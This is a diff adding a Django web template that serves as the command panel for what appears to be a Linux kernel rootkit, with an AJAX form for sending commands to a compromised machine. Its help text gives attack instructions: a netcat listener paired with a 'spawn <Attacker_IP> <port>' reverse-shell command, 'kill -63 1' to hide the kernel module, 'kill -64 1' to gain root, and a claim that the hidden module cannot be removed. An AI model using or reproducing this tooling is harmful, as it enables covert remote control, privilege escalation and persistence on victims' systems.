@@ -1,0 +1,87 @@
+{% extends 'base.html' %}
+
+{% block title %} Send Commands {% endblock %}
+
+{% block javascript %}
+<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
+
+<script>
+$(document).ready(function() {
+  // Submit the form using AJAX when the user clicks the submit button
+  $('form').submit(function(event) {
+    event.preventDefault();
+    var form = $(this);
+    var url = form.attr('action');
+    var data = form.serialize();
+
+    $.ajax({
+      url: url,
+      type: 'POST',
+      data: data,
+      success: function(response) {
+        $('#response').html(response);
+      },
+      error: function() {
+        alert('An error occurred while sending the command.');
+      }
+    });
+  });
+
+  $(document).ajaxStart(function(){
+    $('#response').html('<div class="text-center"><div class="spinner-grow text-secondary spinner-grow-sm" style="margin: 1rem;" role="status"></div><div class="spinner-grow text-secondary spinner-grow-sm" style="margin: 1rem;" role="status"></div><div class="spinner-grow text-secondary spinner-grow-sm" style="margin: 1rem;" role="status"></div></div>');
+  });
+
+});
+
+</script>
+
+{% endblock %}
+
+{% block content %}
+  <div style="padding:3rem;">
+    <h1 class="text-center">Send Commands</h1>
+  </div>
+    
+  <div class="row">
+
+    <div class="col-md-6">
+      <div class="col">
+        <h4 class="text-start">Help:</h4>
+        <ul class="text-start">
+          <li>To spawn a new shell from different device. eg: </br> <span style="padding: 1.7rem">Attacker side</span> | <span style="padding: 1.7rem;">Command</span><pre>'nc -lvnp &lt;port&gt;' | 'spawn &lt;Attacker_IP&gt; &lt;port&gt;'</pre></li>
+          <li>To kill the connection (reverse shell process) type <pre>'kill -9 &lt;pid&gt;'</pre></li>
+          <li>To toggle between hide and show the kernel module. <pre>'kill -63 1'</pre></li>
+          <li>To gain root privilege in the target machine from any other attacking machine using reverse shell like above. <pre>'kill -64 1'</pre></li>
+        </ul>
+      </div>
+
+      <div class="col">
+        <h4>Note:</h4>
+        <ul class="text-start">
+          <li>Note that if you kill the reverse shell process then you have to install the kernel rootkit module again into the target system</li>
+          <li>No one can remove the module if it's hidden</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="col-md-6">
+      <div class="col">
+        <form method="POST">
+          {% csrf_token %}
+          <div class="input-group mb-3">
+            {{ form.command }}
+            <button class="btn btn-outline-secondary" type="submit" id="button-addon2">Send</button>
+          </div>
+        </form>
+      </div>
+
+      <div class="col">
+        <h2>Response:</h2>
+        <pre class="text-break text-start" id="response"></pre>
+      </div>  
+    </div>
+
+    
+  </div>
+
+{% endblock %}
